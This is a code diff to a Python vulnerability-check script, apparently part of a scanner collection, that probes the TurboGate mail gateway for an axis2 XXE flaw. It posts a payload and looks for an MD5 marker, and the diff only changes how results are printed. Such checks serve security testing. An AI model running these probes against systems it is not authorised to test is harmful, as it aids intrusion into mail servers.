@@ -8,6 +8,7 @@ description: TurboGate其实相当于TurboMail的早期版本，TurboGate集成�
         在TurboGate中使用的是axis2<=1.5.1版本，存在XXE漏洞，在利用的时候需要将Content-Type设置为application/xml。
 '''
 import sys
+import json
 import requests
 import warnings
 from termcolor import cprint
@@ -27,10 +28,12 @@ class turbogate_services_xxe_BaseVerify():
         try:
             req = requests.post(vulnurl, headers=headers, data=post_data, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
-                cprint("[+]存在TurboGate邮件网关XXE漏洞...(高危)\tpayload: "+vulnurl+"\t\tpost: "+post_data, "red")
+                cprint("[+]存在TurboGate邮件网关XXE漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+post_data+"\npost: "+json.dumps(post_data, indent=4), "red")
+            else:
+                cprint("[-]不存在turbogate_services_xxe漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
